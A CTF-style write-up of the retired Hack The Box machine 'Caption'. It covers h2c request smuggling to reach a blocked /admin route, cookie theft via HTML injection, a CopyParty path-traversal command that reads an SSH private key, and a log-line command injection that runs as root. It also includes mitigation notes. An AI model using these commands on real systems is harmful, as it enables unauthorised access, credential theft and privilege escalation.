---
machine: Caption
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, http2, request-smuggling, copyparty, privesc]
---

# Caption — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

The proxy blocks admin routes but accepts h2c, allowing request smuggling to reach them. HTML injection steals the admin cookie; CopyParty exposes a traversal that reads an SSH key. Escalation abuses command injection in the log handler.

## Recon

```bash
nmap -Pn -sCV -p22,80,443 <IP>
```

- Ports: `22/tcp` SSH, `80/tcp` HTTP and `443/tcp` HTTPS.
- Services: Caching proxy in front of a web application and a CopyParty instance.
- Technologies: HAProxy/Varnish, HTTP/2 cleartext (h2c), CopyParty and a log handler.

## Enumeration

- `caption.htb` behind a proxy returning 403 on `/admin`.
- `copy.caption.htb` running CopyParty.
- The server accepts cleartext HTTP/2 prior knowledge.
- Admin session cookie and internal routes.

## Foothold

Use h2c smuggling so the proxy forwards a request to `/admin` that the frontend blocks. HTML injection on an admin-visible page exfiltrates the cookie; with it, access CopyParty and a traversal that reads `id_rsa`.

```bash
curl --http2-prior-knowledge -s http://caption.htb/admin
python3 h2cSmuggler.py -u http://caption.htb/admin
curl "http://copy.caption.htb/?path=../../../../home/<USER>/.ssh/id_rsa"
ssh -i id_rsa <USER>@caption.htb
```

## Lateral movement

The admin cookie grants access to the internal interface; from there, locate CopyParty and the system user key.

## Privilege escalation

A privileged process handles logs in a writable directory. Inject a line containing a command and the handler executes it as root.

```bash
sudo -l
ls -l /var/log/<APP>/
printf 'x; /bin/bash -c "id" #\n' >> /var/log/<APP>/access.log
# Replace id with the desired action and wait for the handler.
```

## Evidence

- HTTP 200 for `/admin` after smuggling.
- Admin cookie and CopyParty access.
- SSH key read and root prompt.

## Lessons learned

- Blocking routes at the frontend fails if the backend accepts another protocol.
- CopyParty must restrict traversal and not run with broad access.
- Logs are untrusted data for any privileged processor.

## Mitigation and detection

- Reject h2c at the proxy and normalize the protocol on every hop.
- Restrict CopyParty and validate canonical paths.
- Parse logs as data and run the handler without a shell.

## References

- [0xdf — Caption](https://0xdf.gitlab.io/2025/01/25/htb-caption.html)
- [IppSec — Caption](https://www.youtube.com/watch?v=JY_xds4LsW0)
- [Hack The Box — Caption](https://app.hackthebox.com/machines/caption)
